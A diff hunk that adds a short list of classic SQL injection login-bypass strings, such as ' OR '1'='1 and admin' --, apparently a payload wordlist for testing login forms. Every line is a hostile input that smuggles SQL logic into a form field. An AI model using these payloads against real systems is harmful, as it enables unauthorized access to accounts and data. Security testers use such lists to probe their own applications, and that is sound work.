@@ -1,0 +1,1 @@
+' OR '1'='1\n' OR '1'='1' --\n" OR "1"="1\n' OR '1'='1' /* \n' OR 1=1 --\n' OR 1=1 #\n' OR 1=1/*\nadmin' --\nadmin' #\nadmin'/*\n' OR 'a'='a
